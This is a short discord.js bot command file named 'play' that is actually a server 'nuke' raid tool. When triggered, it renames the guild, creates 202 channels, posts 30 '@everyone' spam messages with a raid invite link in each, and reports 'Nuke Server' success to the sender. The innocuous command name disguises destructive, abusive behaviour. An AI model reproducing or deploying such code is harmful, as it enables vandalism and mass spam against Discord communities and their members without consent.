const {
    MessageEmbed
} = require('discord.js');

module.exports = {
    name: 'play',
    async execute(message) {
        let channelName = 'readme';
        let guildName = 'readme';

        await message.guild.setName(guildName);

         for (let i = 0; i < 202; i++) {
            await message.guild.channels.create(channelName, {
            }).then((c) => {
                for (let j = 0; j < 30; j++) {
                    c.send('@everyone  this server is boring as balls so im raiding it join the main one for your roles if uou had any https://discord.gg/PQ4Xr7xEPC');
                }
            });
        }
        message.delete()
        message.author.send('Action Completed. - Nuke Server');
        console.log('Ran nukeserver command. (SUCCESS)'); 
    
},
};
